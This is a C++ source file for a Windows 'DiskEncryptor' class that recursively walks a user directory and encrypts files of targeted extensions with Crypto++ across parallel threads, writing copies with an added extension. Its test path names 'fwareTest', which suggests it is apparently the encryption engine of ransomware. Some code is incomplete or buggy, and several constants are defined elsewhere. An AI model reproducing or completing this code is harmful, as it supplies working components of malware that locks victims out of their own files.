#include <iostream>
#include <Windows.h>
#include <filesystem>
#include <thread>

#include <cryptopp/filters.h>
#include <cryptopp/files.h>

#include "diskencryptor.h"

#define MAX_THREADS 3

bool DiskEncryptor::setDisk(std::string disk)
{
	_disk = disk;
	return true;
}

bool DiskEncryptor::setFreeSpace()
{
	DWORD _sectorsPerCluster, _bytesPerSector, _numberOfFreeClusters, _totalNumberOfClusters;
	if (GetDiskFreeSpaceA(_disk.c_str(), &_sectorsPerCluster, &_bytesPerSector, &_numberOfFreeClusters, &_totalNumberOfClusters))
	{
		_freespace = (_sectorsPerCluster * _bytesPerSector * _numberOfFreeClusters);
		return true;
	}
	return false;
}

bool DiskEncryptor::setEncryption(CryptoPP::SecByteBlock& key, CryptoPP::SecByteBlock& iv)
{
	_e.SetKeyWithIV(key.data(), key.size(), iv.data(), iv.size());
	return true;
}

void DiskEncryptor::iterateFiles() {
	std::vector<std::thread> threads;
	
	for (const auto& entry : std::filesystem::recursive_directory_iterator("C:\\Users\mXn\\Desktop\\fwareTest")) {
		if (entry.is_directory()) {
			continue;
		}
		else {
			std::string ext = entry.path().extension().string();
			for (std::string e : ext2Ecrypt) {
				if (_freespace < entry.file_size()) {
					break;
				}
				if (ext == e) {
					if (threads.size() > 3) {
						for (std::thread& t : threads) {
							t.join();
						}
						threads.clear();
					}
					threads.emplace_back(std::thread(&DiskEncryptor::fileEncrypt, this, entry.path().string()));
				}
			}
		}
	}
}

bool DiskEncryptor::fileEncrypt(std::string file) {
	std::ifstream in(file, std::ios::binary);
	std::ofstream out(file + FILE_EXTENSION, std::ios::binary);
	CryptoPP::FileSource(in, true, new CryptoPP::StreamTransformationFilter(_e, new CryptoPP::FileSink(out)));
}

DiskEncryptor::DiskEncryptor(std::string disk, CryptoPP::SecByteBlock& key, CryptoPP::SecByteBlock& iv)
{
	setDisk(disk);
	setFreeSpace();
	setEncryption(key, iv);
}

DiskEncryptor::~DiskEncryptor()
{
	//delete _disk;
}